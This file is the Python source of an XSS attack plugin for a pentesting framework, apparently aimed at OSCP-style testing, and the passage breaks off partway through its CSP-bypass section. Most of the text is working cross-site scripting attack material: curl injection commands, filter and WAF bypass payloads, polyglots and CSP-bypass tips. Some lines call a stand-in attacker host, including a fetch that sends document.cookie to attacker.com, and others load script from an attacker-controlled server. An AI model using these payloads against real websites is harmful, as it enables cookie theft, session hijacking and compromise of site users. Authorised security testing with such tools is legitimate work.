"""
XSS (Cross-Site Scripting) Attack Plugin

Comprehensive XSS enumeration and exploitation including:
- Reflected, Stored, and DOM-based XSS
- Filter bypass techniques (WAF, sanitization, encoding)
- CSP bypass methods
- Client-side template injection (AngularJS, Vue, React)
- XS-Search and XS-Leaks techniques
- DOM Clobbering
- Dangling Markup injection
- XSSI (Cross-Site Script Inclusion)
- Mutation XSS (mXSS)
- Universal XSS vectors

Extracted from HackTricks pentesting-web/xss-cross-site-scripting/
Generated by: CrackPot v1.0
Mining Date: 2025-10-07
"""

from typing import Dict, Any, List, Optional
import logging
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class XSSAttacksPlugin(ServicePlugin):
    """
    XSS Attack Plugin - Comprehensive Cross-Site Scripting Testing

    Detects web services and generates XSS enumeration tasks covering:
    - All XSS contexts (HTML, attributes, JavaScript, event handlers)
    - Filter bypass and encoding techniques
    - CSP bypass strategies
    - Client-side framework injection
    - Advanced XSS variants (XS-Search, DOM Clobbering, XSSI)
    """

    @property
    def name(self) -> str:
        return "xss-attacks"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8000, 8080, 8443, 3000, 4200, 5000]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect HTTP/web services for XSS testing"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Service name match
        if any(svc in service for svc in self.service_names):
            return True

        # Common HTTP ports
        if port in self.default_ports:
            return True

        # HTTP-related products
        if any(prod in product for prod in ['http', 'web', 'apache', 'nginx', 'iis']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate comprehensive XSS attack task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', 'Unknown')

        # Detect HTTPS
        is_https = port in [443, 8443] or 'ssl' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        base_url = f'{protocol}://{target}:{port}'

        tasks = {
            'id': f'xss-attacks-{port}',
            'name': f'XSS Attack Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # ===================================================================
        # PHASE 1: XSS DISCOVERY & CONTEXT IDENTIFICATION
        # ===================================================================

        # 1.1 Automated XSS Scanning
        tasks['children'].append({
            'id': f'xss-scan-automated-{port}',
            'name': 'Automated XSS Scanning',
            'type': 'parent',
            'children': [
                {
                    'id': f'xsstrike-scan-{port}',
                    'name': 'XSStrike Scanning',
                    'type': 'command',
                    'metadata': {
                        'command': f'xsstrike -u {base_url}/ --crawl --fuzzer',
                        'description': 'Automated XSS fuzzing with context detection',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-u': f'Target URL: {base_url}/',
                            '--crawl': 'Crawl website for injectable endpoints',
                            '--fuzzer': 'Enable intelligent fuzzing engine'
                        },
                        'success_indicators': [
                            'XSS vulnerability found',
                            'Payload successfully executed',
                            'Injectable parameters discovered'
                        ],
                        'failure_indicators': [
                            'No injectable parameters',
                            'All payloads blocked by WAF',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Test discovered parameters manually for WAF bypass',
                            'Try context-specific payloads',
                            'Check for DOM XSS with browser DevTools'
                        ],
                        'alternatives': [
                            f'Manual: Inject <script>alert(1)</script> in all parameters',
                            f'dalfox url {base_url}/ --crawl',
                            'Burp Suite Intruder with XSS wordlist'
                        ],
                        'notes': 'XSStrike automatically detects context (HTML, attribute, JS). Install: pip3 install xsstrike. For OSCP: Always verify automated findings manually.'
                    }
                },
                {
                    'id': f'dalfox-scan-{port}',
                    'name': 'Dalfox Advanced XSS Scanning',
                    'type': 'command',
                    'metadata': {
                        'command': f'dalfox url {base_url}/ --worker 100 --output dalfox-{port}.txt',
                        'description': 'Fast XSS scanner with blind XSS and DOM testing',
                        'tags': ['OSCP:HIGH', 'AUTOMATED'],
                        'flag_explanations': {
                            'url': f'Target URL: {base_url}/',
                            '--worker 100': 'Use 100 concurrent workers (fast)',
                            '--output': 'Save results for OSCP documentation'
                        },
                        'success_indicators': [
                            'XSS found in parameter',
                            'Blind XSS callback received',
                            'DOM XSS detected'
                        ],
                        'failure_indicators': [
                            'No vulnerabilities',
                            'Rate limited',
                            'All requests blocked'
                        ],
                        'next_steps': [
                            'Test WAF bypass if blocked',
                            'Check reflected values for context',
                            'Try manual polyglot payloads'
                        ],
                        'alternatives': [
                            f'Manual: Test each parameter with <img src=x onerror=alert(1)>',
                            f'xsstrike -u {base_url}/ --fuzzer',
                            'Burp Collaborator for blind XSS'
                        ],
                        'notes': 'Dalfox finds XSS in parameters, headers, and DOM. Install: go install github.com/hahwul/dalfox/v2@latest'
                    }
                }
            ]
        })

        # 1.2 Manual XSS Discovery
        tasks['children'].append({
            'id': f'xss-discovery-manual-{port}',
            'name': 'Manual XSS Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-param-reflection-{port}',
                    'name': 'Parameter Reflection Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify parameters that reflect user input in HTTP responses',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            f'Burp Proxy: Inject REFLECTION_TEST_VALUE in all params',
                            f'curl "{base_url}/?search=REFLECTION_TEST&id=REFLECTION_TEST" | grep REFLECTION',
                            f'Browser DevTools: Search for injected values in DOM'
                        ],
                        'success_indicators': [
                            'Injected value appears in HTML response',
                            'Parameter reflected in JavaScript code',
                            'Value visible in page source/DOM'
                        ],
                        'failure_indicators': [
                            'No reflection detected',
                            'Value sanitized/encoded',
                            'Server returns error on special chars'
                        ],
                        'next_steps': [
                            'Identify context: raw HTML, attribute, JS code',
                            'Test special chars: < > " \' ( ) { }',
                            'Check for encoding: HTML entities, URL encoding, Unicode'
                        ],
                        'notes': 'CRITICAL: Identify WHERE your input reflects BEFORE choosing payload. Context determines exploitation strategy. Test all params: GET, POST, headers, cookies.'
                    }
                },
                {
                    'id': f'xss-context-mapping-{port}',
                    'name': 'XSS Context Identification',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Determine the exact context where input is reflected (critical for payload selection)',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            '1. Raw HTML context: <div>YOUR_INPUT</div>',
                            '2. HTML attribute: <input value="YOUR_INPUT">',
                            '3. JavaScript string: var x = "YOUR_INPUT";',
                            '4. JavaScript code: <script>eval(YOUR_INPUT)</script>',
                            '5. Event handler: <div onclick="YOUR_INPUT">',
                            '6. URL: <a href="YOUR_INPUT">'
                        ],
                        'success_indicators': [
                            'Context identified via View Source',
                            'Special chars not encoded in context',
                            'Payload possibility confirmed'
                        ],
                        'failure_indicators': [
                            'Heavy encoding applied',
                            'Input reflected in safe context (text node only)',
                            'Blacklist prevents context escape'
                        ],
                        'next_steps': [
                            'Raw HTML → Use <script>alert(1)</script> or <img src=x onerror=alert(1)>',
                            'HTML attribute → Close attribute: "><script>alert(1)</script>',
                            'JS string → Escape string: \';alert(1);//',
                            'Event handler → Direct code: alert(1)',
                            'URL → Use javascript:alert(1) or data:text/html,<script>alert(1)</script>'
                        ],
                        'notes': 'OSCP KEY CONCEPT: 5 XSS contexts require different payloads. View page source to identify exact reflection point. Browser DevTools may show sanitized version.'
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 2: CONTEXT-SPECIFIC XSS EXPLOITATION
        # ===================================================================

        # 2.1 Raw HTML Context
        tasks['children'].append({
            'id': f'xss-raw-html-{port}',
            'name': 'XSS in Raw HTML Context',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-html-basic-{port}',
                    'name': 'Basic HTML Tag Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/?search=<script>alert(1)</script>" | grep "<script>"',
                        'description': 'Test basic <script> tag injection in HTML context',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '?search=': 'Parameter to inject XSS payload',
                            '<script>alert(1)</script>': 'Basic XSS payload (HTML context)',
                            '| grep': 'Check if payload reflected without encoding'
                        },
                        'success_indicators': [
                            '<script> tag visible in HTML source',
                            'No HTML entity encoding (&lt;)',
                            'Tag not stripped/filtered'
                        ],
                        'failure_indicators': [
                            '<script> blocked by WAF',
                            'HTML entities: &lt;script&gt;',
                            'Tag removed from output'
                        ],
                        'next_steps': [
                            'If blocked: Try <img src=x onerror=alert(1)>',
                            'If filtered: Try obfuscation <ScRiPt>alert(1)</ScRiPt>',
                            'If sanitized: Check for dangling markup attack'
                        ],
                        'alternatives': [
                            f'Browser test: Navigate to {base_url}/?search=<script>alert(1)</script>',
                            '<img src=x onerror=alert(1)> (no script tag)',
                            '<svg onload=alert(1)> (alternative event)',
                            '<body onload=alert(1)> (if page allows body tag)'
                        ],
                        'notes': 'If <script> blocked, img/svg work because no script keyword. Modern apps often block <script> but miss event handlers.'
                    }
                },
                {
                    'id': f'xss-tag-bruteforce-{port}',
                    'name': 'HTML Tag Brute-force',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" | grep -oP "(?<=<)[a-z]+(?= )" | sort -u | while read tag; do curl -s "{base_url}/?search=<$tag>" | grep -q "<$tag" && echo "Tag allowed: $tag"; done',
                        'description': 'Brute-force allowed HTML tags when blacklist is in use',
                        'tags': ['OSCP:MEDIUM', 'ENUM'],
                        'flag_explanations': {
                            'portswigger.net': 'Source of XSS tag cheat sheet',
                            'grep -oP': 'Extract tag names with regex',
                            'while read tag': 'Loop through each tag',
                            'grep -q': 'Check if tag reflected (silent mode)'
                        },
                        'success_indicators': [
                            'One or more tags allowed',
                            'Tags found: img, svg, iframe, etc.'
                        ],
                        'failure_indicators': [
                            'All tags blocked',
                            'Only safe tags allowed (div, span)',
                            'WAF blocking all attempts'
                        ],
                        'next_steps': [
                            'Test event handlers on allowed tags',
                            'If no tags: Try custom tag <xss id=x onfocus=alert(1) tabindex=1>#x',
                            'Research tag-specific XSS payloads'
                        ],
                        'alternatives': [
                            'Burp Intruder: Paste tags from PortSwigger cheat sheet',
                            'Manual: Test top tags: img, svg, iframe, embed, object, video, audio, details, base',
                            'Use XSS polyglot: \'"><img src=x onerror=alert(1)>'
                        ],
                        'notes': 'PortSwigger cheat sheet has 100+ tags. Brute-force takes ~2-3 min. Focus on tags with event handlers (img, svg, video). OSCP exam: Manual testing with top 10 tags faster.'
                    }
                },
                {
                    'id': f'xss-event-bruteforce-{port}',
                    'name': 'Event Handler Brute-force',
                    'type': 'command',
                    'metadata': {
                        'command': f'for event in onload onerror onclick onmouseover onfocus onmouseenter; do curl -s "{base_url}/?search=<img src=x $event=alert(1)>" | grep -q "$event=alert" && echo "Event allowed: $event"; done',
                        'description': 'Brute-force allowed event handlers after finding valid tag',
                        'tags': ['OSCP:MEDIUM', 'ENUM'],
                        'flag_explanations': {
                            'for event in': 'Loop through common event handlers',
                            '<img src=x $event=alert(1)>': 'Test event on valid tag (img)',
                            'grep -q': 'Check if event handler not stripped'
                        },
                        'success_indicators': [
                            'Event handler allowed: onerror, onload, etc.',
                            'Event reflected without encoding'
                        ],
                        'failure_indicators': [
                            'All event handlers blocked',
                            'Only safe events allowed (onchange)',
                            'Event handler syntax broken'
                        ],
                        'next_steps': [
                            'Craft final payload with allowed tag + event',
                            'Test user interaction events if passive events blocked',
                            'Try obfuscation: onerror vs OnErRoR vs on%0Aerror'
                        ],
                        'alternatives': [
                            'Burp Intruder: Test 100+ events from PortSwigger',
                            'Manual top events: onerror, onload, onclick, onmouseover, onfocus, onanimationstart',
                            'Style events: <p style="animation:x" onanimationstart=alert(1)>XSS</p>'
                        ],
                        'notes': 'Common bypass: Whitespace variations between event and =. Chrome allows: %09 %20 %28 %2C %3B. Firefox: %09 %20 %28 %2C %3B. Test: <svg%09onload=alert(1)>'
                    }
                }
            ]
        })

        # 2.2 HTML Attribute Context
        tasks['children'].append({
            'id': f'xss-attribute-context-{port}',
            'name': 'XSS in HTML Attribute Context',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-attr-escape-{port}',
                    'name': 'Attribute Escape and New Tag',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/?name=test%22><script>alert(1)</script>" | grep \'"></\' ',
                        'description': 'Escape from HTML attribute and inject new tag',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '%22': 'URL-encoded double quote to close attribute',
                            '>': 'Close the HTML tag',
                            '<script>alert(1)</script>': 'Inject new script tag',
                            'grep \'"><\'': 'Verify attribute escape successful'
                        },
                        'success_indicators': [
                            '"> visible in source (attribute closed)',
                            'Script tag successfully injected',
                            'No encoding of quotes or angle brackets'
                        ],
                        'failure_indicators': [
                            'Quotes encoded: &quot; or %22 in output',
                            'Angle brackets encoded: &lt; &gt;',
                            '"> filtered or removed'
                        ],
                        'next_steps': [
                            'If quotes blocked: Try event handler without escaping',
                            'If > blocked but not ": " autofocus onfocus=alert(1) x="',
                            'If all blocked: Check for HREF/SRC attribute with javascript: protocol'
                        ],
                        'alternatives': [
                            'Event injection (no escape): " onfocus=alert(1) x="',
                            'Single quote escape: \'>alert(1);//',
                            'Browser test: View Source to confirm escape',
                            'HTML entities bypass: &quot;&gt;<script>alert(1)</script> (entities decoded in attributes)'
                        ],
                        'notes': 'Context: <input value="YOUR_INPUT">. Best case: "><script>alert(1)</script>. If > blocked: " autofocus onfocus=alert(1) x=". OSCP tip: HTML entities decoded in attribute values!'
                    }
                },
                {
                    'id': f'xss-attr-inline-event-{port}',
                    'name': 'Inline Event Handler Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/?name=test%22%20autofocus%20onfocus=alert(1)%20x=%22" ',
                        'description': 'Inject event handler without escaping from attribute (when > is blocked)',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'flag_explanations': {
                            '%22': 'Close current attribute value',
                            '%20autofocus': 'Make element auto-focus',
                            '%20onfocus=alert(1)': 'Execute JS on focus',
                            '%20x=%22': 'Open new dummy attribute to absorb closing quote'
                        },
                        'success_indicators': [
                            'onfocus event reflected in HTML',
                            'Alert fires when element focused',
                            'Payload bypassed > filter'
                        ],
                        'failure_indicators': [
                            'onfocus stripped',
                            'Quotes encoded preventing attribute injection',
                            'Autofocus ignored by browser/CSP'
                        ],
                        'next_steps': [
                            'Try other events: onblur, oninput, onchange, onmouseover',
                            'For user interaction: onclick with social engineering',
                            'Test accesskey trick: " accesskey=X onclick=alert(1) x=" (requires user to press ALT+SHIFT+X)'
                        ],
                        'alternatives': [
                            '" onclick=alert(1) x=" (requires click)',
                            '" style=animation:x onanimationstart=alert(1) x=" (no user interaction)',
                            'Hidden input XSS: <button popvertarget=x>Click</button><input type=hidden value=" popover id=x onbeforetoggle=alert(1) x=">'
                        ],
                        'notes': 'Use when " allowed but > blocked. Payload: " autofocus onfocus=alert(1) x=". autofocus makes event trigger without interaction. For OSCP: Document exact characters blocked.'
                    }
                },
                {
                    'id': f'xss-attr-protocol-{port}',
                    'name': 'JavaScript Protocol in Attribute',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/?url=javascript:alert(1)" | grep "javascript:"',
                        'description': 'Inject javascript: protocol in href/src/action attributes',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            'javascript:alert(1)': 'Execute JS via javascript: pseudo-protocol',
                            'grep "javascript:"': 'Verify protocol not filtered'
                        },
                        'success_indicators': [
                            'javascript: visible in href/src/action',
                            'Alert fires when link clicked/form submitted',
                            'No protocol blocking in place'
                        ],
                        'failure_indicators': [
                            'javascript: filtered or replaced',
                            'URL validation blocks protocol',
                            'CSP blocks inline scripts'
                        ],
                        'next_steps': [
                            'Try obfuscation: JaVaScRiPt:alert(1)',
                            'Try encoding: javascript%3Aalert(1) or javascript:alert(1)',
                            'Try data: protocol: data:text/html,<script>alert(1)</script>',
                            'Try newline: java%0Ascript:alert(1)'
                        ],
                        'alternatives': [
                            '<a href="javascript:alert(1)">Click</a>',
                            '<form action="javascript:alert(1)"><button>Submit</button></form>',
                            '<iframe src="javascript:alert(1)">',
                            '<embed src="javascript:alert(1)">',
                            'data: protocol: <a href="data:text/html,<script>alert(1)</script>">',
                            'Hex encoding: <iframe src="javascript:\\x61\\x6c\\x65\\x72\\x74(1)">'
                        ],
                        'notes': 'Works in: <a href>, <form action>, <iframe src>, <embed src>, <object data>. Does NOT work in <img src>. URL encoding auto-decoded before execution. OSCP: Always try case variation + encoding.'
                    }
                },
                {
                    'id': f'xss-attr-html-encoding-{port}',
                    'name': 'HTML Entity Encoding Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass filters using HTML entity encoding in attribute values (decoded at runtime)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            '<a href="javascript:var a=&apos;-alert(1)-&apos;">Click</a> (HTML entities decoded)',
                            '<a href="&#106;avascript:alert(1)">Click</a> (decimal encoding)',
                            '<a href="jav&#x61script:alert(1)">Click</a> (hex encoding)',
                            '<div onclick="var x=&#39;-alert(1)-&#39;">Click</div>',
                            'Unicode: <img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>'
                        ],
                        'success_indicators': [
                            'HTML entities decoded and executed',
                            'Alert fires despite encoding',
                            'Filter bypassed via encoding'
                        ],
                        'failure_indicators': [
                            'Entities remain encoded (not decoded)',
                            'Attribute context doesn\'t decode entities',
                            'CSP blocks execution'
                        ],
                        'next_steps': [
                            'Try all encodings: HTML decimal, HTML hex, Unicode',
                            'Mix encodings: j&#97;vascript:alert(1)',
                            'Test in different attributes (onclick, onload, href)'
                        ],
                        'notes': 'KEY: HTML entities/URL encoding DECODED in attribute values before execution. Example: onclick="&apos;-alert(1)-&apos;" → onclick="\'-alert(1)-\'". Works with: &#39 (decimal), &#x27 (hex), &apos (entity), Unicode \\u0027.'
                    }
                }
            ]
        })

        # 2.3 JavaScript Context
        tasks['children'].append({
            'id': f'xss-javascript-context-{port}',
            'name': 'XSS in JavaScript Context',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-js-string-escape-{port}',
                    'name': 'JavaScript String Escape',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/?name=test%27;alert(1);//" | grep "\';alert"',
                        'description': 'Escape from JavaScript string and execute code',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '%27': 'Single quote to close JavaScript string',
                            ';alert(1);': 'Execute arbitrary JS',
                            '//': 'Comment out rest of original code'
                        },
                        'success_indicators': [
                            "';alert(1);// visible in <script> tag",
                            "Alert fires when page loads",
                            'No quote escaping (backslash-quote)'
                        ],
                        'failure_indicators': [
                            'Quotes escaped with backslashes',
                            'Semicolon blocked',
                            'Input placed in template literal'
                        ],
                        'next_steps': [
                            r"If \' blocked: Try closing script tag </script><script>alert(1)</script>",
                            r"If semicolon blocked: Use comma operator: ',alert(1),\'",
                            'If in template literal: Use ${alert(1)}'
                        ],
                        'alternatives': [
                            "Single quote: \';alert(1);//",
                            'Double quote: \\";alert(1);//',
                            'Close script: </script><script>alert(1)</script>',
                            'Template literal: ${alert(1)} (if in backticks)',
                            'Unicode: alert(1) (valid JS, no escape needed)'
                        ],
                        'notes': 'Context: <script>var x = "YOUR_INPUT";</script>. Browser parses HTML BEFORE JS, so </script> always escapes even if in string. Template literals (`): Use ${alert(1)} without string escape.'
                    }
                },
                {
                    'id': f'xss-js-template-literal-{port}',
                    'name': 'Template Literal Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/?name=$%7Balert(1)%7D" | grep "${{alert"',
                        'description': 'Inject code in JavaScript template literals (backticks)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'flag_explanations': {
                            '$%7B': 'URL-encoded ${ (template literal expression start)',
                            'alert(1)': 'JS code to execute',
                            '%7D': 'URL-encoded } (close expression)'
                        },
                        'success_indicators': [
                            '${alert(1)} visible in script',
                            'Alert fires (expression executed)',
                            'Template literal syntax accepted'
                        ],
                        'failure_indicators': [
                            '${} escaped or removed',
                            'Not in template literal context',
                            'Input in regular string (single/double quotes)'
                        ],
                        'next_steps': [
                            'Confirm context: <script>var x = `YOUR_INPUT`;</script>',
                            r"Try complex expressions: ${window.location='http://attacker.com'}",
                            'Check if this.constructor.constructor available'
                        ],
                        'alternatives': [
                            'Simple: ${alert(1)}',
                            r"Constructor: ${this.constructor.constructor('alert(1)')()}",
                            r'Fetch: ${fetch("http://attacker.com/"+document.cookie)}',
                            r"Eval: ${eval('alert(1)')}"
                        ],
                        'notes': 'Template literals use backticks: `string`. ${expression} executes JS inside. Common in modern JavaScript (ES6+). No need to escape quotes. Works in Angular/Vue/React template strings.'
                    }
                },
                {
                    'id': f'xss-js-close-tag-{port}',
                    'name': 'Script Tag Closure',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/?name=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E" | grep "</script><script>"',
                        'description': 'Close existing script tag and inject new one (works even in JS strings)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '%3C/script%3E': 'URL-encoded </script> to close current tag',
                            '%3Cscript%3E': 'Open new script tag',
                            'alert(1)': 'Execute code in new context'
                        },
                        'success_indicators': [
                            '</script><script> visible in source',
                            'Browser closes first script tag',
                            'Alert fires in new script context'
                        ],
                        'failure_indicators': [
                            '</script> filtered or encoded',
                            'Angle brackets encoded',
                            'CSP blocks inline scripts'
                        ],
                        'next_steps': [
                            'If blocked: Try case variation </ScRiPt>',
                            'If still blocked: Try double encoding %253Cscript%253E',
                            'Alternative: Close with </script> and inject <img> tag instead'
                        ],
                        'alternatives': [
                            'Basic: </script><script>alert(1)</script>',
                            'Close and inject event: </script><img src=x onerror=alert(1)>',
                            'Nested: </script><script><script>alert(1)</script>',
                            'Case variation: </ScRiPt><script>alert(1)</script>'
                        ],
                        'notes': 'CRITICAL OSCP CONCEPT: Browser HTML parser runs BEFORE JS parser. Even if </script> is inside a JS string, HTML parser closes the tag. Example: <script>var x="</script><script>alert(1)</script>";</script> → First </script> closes tag!'
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 3: FILTER BYPASS TECHNIQUES
        # ===================================================================

        tasks['children'].append({
            'id': f'xss-filter-bypass-{port}',
            'name': 'XSS Filter Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-waf-bypass-{port}',
                    'name': 'WAF/Blacklist Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass WAF and blacklist filters using encoding, obfuscation, and syntax tricks',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            '# Case variation:\n<ScRiPt>alert(1)</ScRiPt>\n<IMG SRC=x ONERROR=alert(1)>',
                            '# Double tags (first match removed):\n<script><script>alert(1)</script>\n<scr<script>ipt>alert(1)</script>',
                            '# Whitespace alternatives (instead of space):\n<svg/onload=alert(1)>\n<svg%09onload=alert(1)> (tab)\n<svg%0Aonload=alert(1)> (newline)',
                            '# Unexpected attributes:\n<script x>alert(1)</script>\n<script a="1234">alert(1)</script>\n<script~~~>alert(1)</script>',
                            '# Null bytes:\n<scr\\x00ipt>alert(1)</scr\\x00ipt>',
                            '# Extra open:\n<<script>alert(1);//<</script>',
                            '# Backticks instead of parentheses:\nonerror=alert`1`'
                        ],
                        'success_indicators': [
                            'Payload bypasses blacklist',
                            'Alert fires despite filtering',
                            'WAF does not block request'
                        ],
                        'failure_indicators': [
                            'All variations blocked',
                            'Whitelist in place (only allows specific tags)',
                            '403 Forbidden from WAF'
                        ],
                        'next_steps': [
                            'Test polyglot: \\"><img src=x onerror=alert(1)>',
                            'Try rare events: onanimationstart, ontransitionend',
                            'Check for DOM XSS (client-side filtering only)'
                        ],
                        'notes': 'OSCP WAF bypass checklist: 1) Case variation 2) Whitespace alternatives 3) Double tagging 4) Null bytes 5) Encoding (HTML entities, URL, Unicode). Test one technique at a time to identify effective bypass.'
                    }
                },
                {
                    'id': f'xss-polyglot-{port}',
                    'name': 'XSS Polyglot Payloads',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use polyglot payloads that work in multiple contexts (HTML, attribute, JS)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'alternatives': [
                            'Universal: \\"><img src=x onerror=alert(1)>',
                            "PortSwigger: jaVasCript:/*-/*`/*\\`/*\\'/*\"/**/(/* */oNcliCk=alert() )//" + "%0D%0A%0d%0a" + "//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
                            "Rsnake: ';alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\"'>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                            'Minimal: \\"><svg onload=alert(1)>',
                            '''Browser-universal: ';alert(1);var x=\"''',
                        ],
                        'success_indicators': [
                            'Alert fires in any context',
                            'Payload adapts to HTML/attribute/JS',
                            'Single payload works everywhere'
                        ],
                        'failure_indicators': [
                            'Polyglot too complex and blocked',
                            'Context-specific sanitization',
                            'CSP blocks inline scripts'
                        ],
                        'next_steps': [
                            'If polyglot fails: Identify exact context and use targeted payload',
                            'Create custom polyglot based on allowed chars',
                            'Test minimal polyglot first, then complex'
                        ],
                        'notes': "Polyglot = Universal XSS payload. \\\"><img src=x onerror=alert(1)> works in: 1) HTML (injects tag) 2) Attribute (closes attribute with \\\"> then injects) 3) JS string (closes string with \\' then breaks out). OSCP: Start simple, escalate if needed."
                    }
                },
                {
                    'id': f'xss-length-bypass-{port}',
                    'name': 'Length Restrictions Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass character length restrictions with minimal XSS payloads',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            '# Minimal payloads (tinyxss.terjanq.me):\n<svg/onload=alert``> (20 chars)\n<script src=//aa.es> (21 chars)\n<script src=//℡㏛.pw> (22 chars, Unicode expansion)',
                            "# Import external script:\n<script src=//YOUR_VPS/x.js>\nimport('//YOUR_VPS/x.js\")",
                            "# Use existing functions:\nevalif(name)\nlocation=name\nlocation='/\\\"+name",
                            '# Tiny redirect:\n<base href=//attacker.com>'
                        ],
                        'success_indicators': [
                            'Short payload fits in length limit',
                            'External script loaded',
                            'Alert fires despite restriction'
                        ],
                        'failure_indicators': [
                            'Even minimal payload too long',
                            'External script blocked by CSP',
                            'Input truncated mid-payload'
                        ],
                        'next_steps': [
                            'Host external script on your VPS',
                            'Use Unicode ligatures that expand (℡ → telsr)',
                            'Chain with other vulns (CSRF + stored XSS)'
                        ],
                        'notes': 'Length limit scenarios: Max 20-50 chars common in Twitter-like apps. Strategy: Load external script <script src=//YOUR_IP/x>. Unicode trick: ℡ (%E2%84%A1) expands to "telsr" (saves bytes). OSCP: Setup Python HTTP server for external script hosting.'
                    }
                }
            ]
        })

        # ===================================================================
        # PHASE 4: CSP BYPASS
        # ===================================================================

        tasks['children'].append({
            'id': f'xss-csp-bypass-{port}',
            'name': 'Content Security Policy (CSP) Bypass',
            'type': 'parent',
            'children': [
                {
                    'id': f'xss-csp-detect-{port}',
                    'name': 'CSP Detection and Analysis',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -I {base_url} | grep -i "content-security-policy"',
                        'description': 'Detect CSP headers and identify restrictions',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-I': 'Fetch headers only (HEAD request)',
                            'grep -i': 'Case-insensitive search for CSP header',
                            'content-security-policy': 'HTTP header that restricts resource loading'
                        },
                        'success_indicators': [
                            'CSP header present',
                            'Policy directives identified',
                            'Bypasses opportunities spotted'
                        ],
                        'failure_indicators': [
                            'No CSP header (inline scripts allowed)',
                            'Strict CSP (no bypass possible)',
                            'CSP in meta tag not headers'
                        ],
                        'next_steps': [
                            'Analyze CSP: https://csp-evaluator.withgoogle.com/',
                            'Check for unsafe-inline, unsafe-eval',
                            'Look for whitelisted domains to abuse',
                            'Check for nonce/hash bypasses'
                        ],
                        'alternatives': [
                            'Browser DevTools: Console → Security tab shows CSP',
                            'Check meta tag: <meta http-equiv="Content-Security-Policy">',
                            'CSP Evaluator: Paste policy to find weaknesses',
                            'Burp Suite: Proxy → HTTP history → Response headers'
                        ],
                        'notes': 'CSP restricts inline JS (<script>alert(1)</script> blocked). Common bypass: Find whitelisted domain with JSONP endpoint or JavaScript file you control. OSCP: Check for unsafe-inline (allows inline scripts) or missing base-uri (allows <base> tag attacks).'
                    }
                },
                {
                    'id': f'xss-csp-unsafe-inline-{port}',
                    'name': 'CSP unsafe-inline Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit CSP with unsafe-inline or unsafe-eval directives',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'alternatives': [
                            '# If script-src has unsafe-inline:\n<script>alert(1)</script> works normally',
                            "# If script-src has unsafe-eval:\neval('alert(1)')\nsetTimeout(\"alert(1)\")\nFunction(\"alert(1)\")()",
                            '# Event handlers work with unsafe-inline:\n<img src=x onerror=alert(1)>',
                            "# Check CSP:\nscript-src 'unsafe-inline' → Inline scripts allowed\nscript-src 'unsafe-eval' → eval() allowed"
                        ],
                        'success_indicators': [
                            'CSP contains unsafe-inline or unsafe-eval',
                            'Inline scripts execute',
                            'eval() or Function() work'
                        ],
                        'failure_indicators': [
                            'Strict CSP (no unsafe directives)',
